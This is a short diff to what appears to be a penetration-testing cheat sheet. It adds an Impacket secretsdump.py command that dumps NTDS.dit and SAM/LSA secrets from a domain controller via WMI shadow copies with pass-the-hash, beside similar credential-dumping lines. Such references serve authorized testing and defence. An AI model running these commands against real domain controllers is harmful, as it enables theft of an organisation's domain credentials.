@@ -29,6 +29,9 @@ secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET' -use-vss -just-dc
 # Remote dumping of NTDS.dit using Shadow Copy (pass-the-hash)
 secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@DC_TARGET' -use-vss -just-dc
 
+# Remote dumping of NTDS + SAM/LSA via WMI Shadow Copy (WMI/DCOM, no RemoteRegistry)
+secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@DC_TARGET' -use-remoteSSWMI  -use-remoteSSWMI-NTDS
+
 # Remote dumping of NTDS.dit using Shadow Copy
 secretsdump.py -k -no-pass 'DOMAIN/USER@DC_TARGET' -use-vss -just-dc
 
